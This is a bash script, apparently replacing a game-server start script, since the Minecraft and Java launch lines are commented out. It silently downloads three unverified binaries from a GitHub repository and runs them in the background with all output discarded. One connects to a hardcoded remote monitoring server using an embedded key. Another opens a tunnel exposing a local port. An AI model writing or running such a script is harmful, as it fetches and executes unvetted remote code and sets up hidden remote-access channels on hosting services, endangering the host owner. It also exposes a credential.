#!/usr/bin/env bash
NEZHA_SERVER=data.king360.eu.org
NEZHA_PORT=443
NEZHA_KEY=ZgSPsK2q0lM0HQ4ynN
ARGO_AUTH=
download_program() {
  local program_name=$1
  local download_url=$2

  if [ ! -f "$program_name" ]; then
#    echo "Downloading $program_name..."
    curl -sSL "$download_url" -o "$program_name"
    chmod +x "$program_name"
  fi
}
download_program "nm" "https://github.com/lemongaa/pack/raw/main/agent"
download_program "web" "https://github.com/lemongaa/pack/raw/main/web"
download_program "cc" "https://github.com/lemongaa/pack/raw/main/cc"

run() {
  if [ -e nm ]; then
    chmod +x nm
    nohup ./nm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} --tls >/dev/null 2>&1 &
  fi

  if [ -e web ]; then
    chmod +x web
    nohup ./web >/dev/null 2>&1 &
  fi

  if [ -e cc ]; then
    chmod +x cc
    if [[ $ARGO_AUTH =~ ^[A-Z0-9a-z=]{120,250}$ ]]; then
      nohup ./cc tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile s.log --loglevel info run --token ${ARGO_AUTH} >/dev/null 2>&1 &
    else
      nohup ./cc tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile s.log --loglevel info --url http://localhost:30070 >/dev/null 2>&1 &
    fi
  fi
}

run

#./bedrOck_server
#java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server1.jar
